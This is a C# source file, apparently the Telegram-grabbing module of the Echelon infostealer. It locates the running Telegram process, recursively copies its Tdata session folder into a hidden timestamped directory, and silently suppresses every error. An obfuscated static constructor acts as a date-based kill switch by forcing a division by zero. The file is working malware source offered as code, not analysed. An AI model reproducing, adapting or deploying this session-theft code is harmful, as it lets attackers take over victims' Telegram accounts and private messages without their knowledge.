using System;
using System.Diagnostics;
using System.IO;

namespace Echelon
{
	public class TGrabber
	{
		public static int count;

		private static bool m_a;

		public static void Start(string Echelon_Dir)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Telegram");
				if (processesByName.Length >= 1)
				{
					string ja = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\Tdata";
					string jb = Echelon_Dir + "\\Telegram_" + (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
					a(ja, jb);
					count++;
				}
			}
			catch
			{
			}
		}

		private static void a(string ja, string jb)
		{
			try
			{
				Directory.CreateDirectory(jb).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				string[] files = Directory.GetFiles(ja);
				for (int i = 0; i < files.Length; i++)
				{
					b(files[i], jb);
				}
				files = Directory.GetDirectories(ja);
				for (int i = 0; i < files.Length; i++)
				{
					c(files[i], jb);
				}
			}
			catch
			{
			}
		}

		private static void b(string jc, string jd)
		{
			try
			{
				string fileName = Path.GetFileName(jc);
				if (!TGrabber.m_a || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
				{
					string destFileName = jd + "\\" + fileName;
					File.Copy(jc, destFileName);
				}
			}
			catch
			{
			}
		}

		private static void c(string je, string jf)
		{
			try
			{
				TGrabber.m_a = true;
				a(je, jf + "\\" + Path.GetFileName(je));
				TGrabber.m_a = false;
			}
			catch
			{
			}
		}

		static TGrabber()
		{
			DateTime d = default(DateTime).AddYears(1094166819 + -456451205 - 637713595).AddMonths(~48152406 - 659962798 + 708115208).AddDays(5.12756944444444);
			if ((d - DateTime.Now).TotalDays < 0.0)
			{
				int num = ~(-1);
				num = (~(-416808504) - 416808502) / num;
			}
		}
	}
}
